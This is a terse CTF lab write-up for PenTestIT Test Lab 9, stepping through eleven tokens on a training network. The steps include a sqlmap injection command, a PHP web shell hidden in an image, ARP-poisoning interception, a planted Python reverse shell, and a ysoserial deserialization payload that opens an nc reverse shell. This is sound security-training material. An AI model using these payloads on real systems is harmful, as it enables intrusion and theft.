---
title: PenTestIT Test Lab 9 WriteUp
categories: ['CTF WriteUps']
tags: 'PenTestIT'
---

# Pentestit Test Lab v9 WriteUp

# Introduction
So, Test Lab 9 was probably the first real CTF/Hacking lab that I participated in. With no expectation and not much knowledge I decided to give it a try. In the end I got all tokens, with a lot of help from people from the telegram chat. This is my "raw" writeup, that I wrote back then. To be honest I dont wanna spend the time to brush this up so im just gonna post it like it is. Have fun!

# WriteUp
## 1. Bypass WAF
Heartbleed 192.168.101.8:443

found /var/www/html/_old_backup_2010/old_proxy_users

path https://192.168.101.8/_old_backup_2010/old_proxy_users

table contains users to bypass proxy and -> token found

md5 (apr) hashes, with hashcat dehashed


## 2. Mainsite
First use the proxy and change hosts file

use this exploit https://www.exploit-db.com/exploits/37822/

using sqlmap to dump db: sqlmap -u http://172.16.0.5/wp-content/plugins/wp-symposium/ajax/forum_functions.php --data="action=getTopic&topic_id=1 AND SLEEP(5)&group_id=0" --dump-all --proxy http://192.168.101.8:3128 --proxy-cred r.lampman:shalom --output-dir Desktop/dbdump/ -D tl9_mainsite

found wordpress user in table wp_users (maybe use for later)

Mainsite token found in wp_token table :)


## 3. SSH
Now we can attack SSH since port 22 is open on 192.168.101.8

download this tool to enumerate possible users https://github.com/c0r3dump3d/osueta

valid users found, use one to connect ssh daemon@192.168.101.8

word krakenwaffe seems weird... google that. -> found twitter of luka safonov... scroll down twitter and found https://github.com/krakenwaffe/eyelog

in the code the password is set to "daypass" + day of month + hours from midnight

login with daemon and password and were in!^

check users dir /root/home -> 3 users found

login with one of the 3 and the same pw as above

dir and ls show nothing, do ls -al -> directory .ssh seems weird

enter directory with cd .ssh -> token found


## 4. Cisco
if were inside the ssh tunnel we can contact the cisco firewall/router.

so lets nmap it. telnet is open!

telnet 192.168.2.100

login page... trying default password cisco and BAM inside -> token found


## 5. ftp
try connect to ftp with cmd "ftp 172.16.0.4".

login as anonymous and no password works

dir and ls show subdirectory called dist

check file and see that its the sourcecode

download the sourcecode and look at it

found something in /src/help.c

help command "help CYBEAR32C" is new

command doesnt work...

access ftp via nc or telnet

new command works, got admin permission.. browsing dirs -> token found


## 6. Photo
Portscan and see that Webport is open

Webpage open, able to upload file

using this guide: http://hackers2devnull.blogspot.ch/2013/05/how-to-shell-server-via-image-upload.html
create small gif picture.

edit the pic in exiftool and add php code to comment tag: <?if($_GET['r0ng']){echo"<pre>".shell_exec($_GET["r0ng"]);}?>

trying to upload the file with all php executable extensions: php, php2, php3, php4, php5, pht and phtml

file as pht gets uploaded

192.168.0.6/upload/r0ng.pht?r0ng=dir to inject php code and shows dir.

weird subfolder found with txt file in it -> cat textfile -> token found :)


## 7. NAS
Nas has scsi port open

try login via telnet and no user/pass is required

create ssh tunnel on local port: ssh -L 7070:192.168.0.3:3260 -l d.nash 192.168.101.8

install open-iscsi

discover iscsi: iscsiadm -m discovery -t st -p 192.168.0.3

edit iscsi node file to use 127.0.0.1:7070 (for ssh tunnel)

login to iscsi: iscsiadm -m node -T iqn.2016-05.ru.pentestit:storage.lun0 --login

mount iscsi to drive: mount /dev/sdb1 /mnt/iscsi

check the folder and found a 2GB .vmdk file

install xpartx to mount it

mount the vmdk file: kpartx -a /mnt/iscsi/test121-flat.vmdk

browsing the files i notice its windows xp... maybe we can get a password from the hashes in SAM

using ophcrack with xp small list and password of user token_nas_token is tokenXXXXXX --> token found

also password for user d.rector found -> works for webmail and term2!


## 8. Mail
We got ourselfs a user from NAS so lets login with it

send mail with .docx attachment -> mail comes back saying "can only accept microsoft office documents if theyre sent from lampma" -> token found


## 9. Terminal2
Portscan shows that rdp port is open

using proxychain and rdesktop i access the rdp session

login with d.rector and pw

token file on desktop -> token found :D


## 10. Dev
Dev is only accessible from terminal2

Tool on C:\ "interceptor-ng" 

scan for hosts in the net, add dev to the nat

use same gw as term 2

Doing man in the middle (ssh) with arp poisoning -> dev logs in to ftp and downloads test.py script from folder upload\test_scripts

user m.barry with password for ftp found

login to ftp as mbarry, create hidden subfolder (ex. .bilal) with 6 chars

copy test.py, insert pything reverse shell

start listener on reverse-shell port

use change data from tool to change upload for .bilal -> our file gets downloaded and executed on dev

shell opens, browse dirs -> token found 


## 11. Portal

we can login using d.rector, its a vacation list

using burp, see that server uses java serialization and "userdata" string is base64 encoded.

serialization is abusable, download code from github ysoserial and compile it with maven

serialize our nc backdoor with it: java -jar ysoserial-0.0.5-all.jar CommonsCollections5 'nc -e /bin/sh 172.16.0.2 1235' > payload.out

encode it to base64: cat payload.out | base64 -w 0 > payload.out.b64

open listener on 172.16.0.2 1235

login to portal using d.rector, intercept request and changing userdata for payload.out.b64

we get shell open, browse some dirs -> token found
